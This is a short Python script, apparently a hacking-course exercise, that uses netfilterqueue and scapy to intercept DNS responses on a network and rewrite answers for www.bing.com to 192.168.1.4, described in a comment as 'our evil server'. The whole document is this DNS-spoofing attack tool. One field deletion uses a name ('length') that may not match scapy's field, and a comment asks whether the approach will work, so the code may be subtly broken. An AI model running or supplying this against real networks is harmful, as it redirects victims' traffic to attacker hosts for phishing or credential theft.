#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNSQR, DNS, UDP


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
    if scapy_packet.haslayer(DNSRR):  # Checking if a packet has a DNS response.
        qname = scapy_packet[DNSQR].qname  # Getting the qname from the packet.
        if 'www.bing.com' in str(qname):
            print('Spoofing request...')  # scapy_packet.show()
            answer = DNSRR(rrname=qname, rdata='192.168.1.4')  # rdata should be our evil server.
            scapy_packet[DNS].an = answer  # Will this even work?
            scapy_packet[DNS].ancount = 1
            # Deleting the length and checksums, scapy automatically recalculates from our
            # changes.
            del scapy_packet[IP].length
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].chksum
            del scapy_packet[UDP].len
            # Turn the scapy_packet back into a regular packet then send.
            packet.set_payload(bytes(scapy_packet))
    packet.accept()  # Forwards the packets through the queue.
#    packet.drop()  # Drop a packet from the queue.


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Connect our queue to the iptables command queue_num.
queue.run()
